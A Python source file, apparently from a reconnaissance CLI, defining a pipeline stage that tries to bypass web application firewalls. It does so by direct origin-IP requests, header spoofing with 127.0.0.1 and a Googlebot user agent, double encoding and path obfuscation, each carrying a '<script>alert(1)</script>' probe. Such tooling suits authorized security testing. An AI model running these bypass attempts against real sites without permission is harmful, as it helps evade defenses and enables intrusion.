from __future__ import annotations

import random
import string
import asyncio
from typing import Dict, List, Tuple, Any, Optional
from urllib.parse import urlparse, urlunparse, quote

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class WafBypassStage(Stage):
    """
    Advanced WAF Bypass Stage.
    Attempts to bypass detected WAFs using various header and encoding techniques.
    """
    name = "waf_bypass"

    BYPASS_HEADERS = [
        "X-Forwarded-For", "X-Forwarded-Host", "X-Host", "X-Custom-IP-Authorization",
        "X-Original-URL", "X-Rewrite-URL", "X-Originating-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-Client-IP", "Forwarded"
    ]

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_waf_bypass", True))

    async def run_async(self, context: PipelineContext) -> None:
        signals = context.signal_index()
        waf_hosts = signals.get("by_host", {})
        
        # Collect verified origin IPs from findings
        origin_ips = {} # hostname -> ip
        for res in context.filter_results("finding"):
            if res.get("finding_type") == "origin_ip_leak":
                host = res.get("hostname")
                ip = res.get("details", {}).get("ip")
                if host and ip: origin_ips[host] = ip

        targets = []
        for host, host_signals in waf_hosts.items():
            if "waf_detected" in host_signals and "waf_bypass_possible" not in host_signals:
                targets.append(host)

        if not targets:
            context.logger.info("No hosts with detected WAFs requiring bypass attempts")
            return

        runtime = context.runtime_config
        config = HTTPClientConfig(
            max_concurrent=10,
            total_timeout=float(getattr(runtime, "waf_probe_timeout", 10)),
            verify_ssl=bool(getattr(runtime, "verify_tls", True)),
            requests_per_second=10.0
        )

        async with AsyncHTTPClient(config) as client:
            for host in targets:
                url = f"https://{host}/"
                for res in context.filter_results("url"):
                    if res.get("hostname") == host:
                        url = res["url"]; break
                
                await self._attempt_bypasses(context, client, url, origin_ips.get(host))

    async def _attempt_bypasses(self, context: PipelineContext, client: AsyncHTTPClient, url: str, origin_ip: str | None) -> None:
        payload = "<script>alert(1)</script>"
        parsed = urlparse(url)
        
        # 0. Direct Origin IP Bypass
        if origin_ip:
            origin_url = f"{parsed.scheme}://{origin_ip}{parsed.path}"
            headers = {"Host": parsed.hostname, "User-Agent": "Mozilla/5.0"}
            if await self._check_bypass(context, client, origin_url, payload, headers, "origin:direct-ip"):
                return

        # 1. Header Smuggling
        for header in self.BYPASS_HEADERS:
            headers = {header: "127.0.0.1", "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"}
            if await self._check_bypass(context, client, url, payload, headers, f"header:{header}"):
                return

        # 2. Double Encoding
        double_payload = quote(quote(payload))
        if await self._check_bypass(context, client, url, double_payload, {}, "encoding:double"):
            return

        # 3. Path Obfuscation
        obfuscated_path = f"{parsed.path};/{payload}" if parsed.path else f"/;/{payload}"
        test_url = urlunparse(parsed._replace(path=obfuscated_path))
        if await self._check_bypass(context, client, test_url, "", {}, "path:obfuscation"):
            return

    async def _check_bypass(self, context: PipelineContext, client: AsyncHTTPClient, url: str, payload: str, headers: Dict[str, str], technique: str) -> bool:
        test_url = url
        if payload:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}bypass_test={payload}"
        
        try:
            resp = await client.get(test_url, headers=headers, follow_redirects=False)
            if resp.status in [200, 404]:
                context.emit_signal("waf_bypass_confirmed", "url", url, confidence=0.8, source=self.name, tags=["waf", "bypass", technique], evidence={"technique": technique, "status": resp.status})
                context.results.append({
                    "type": "finding", "finding_type": "waf_bypass", "url": url,
                    "description": f"WAF bypass confirmed using technique: {technique}",
                    "severity": "medium", "tags": ["waf", "bypass", "confirmed"]
                })
                return True
        except Exception: pass
        return False
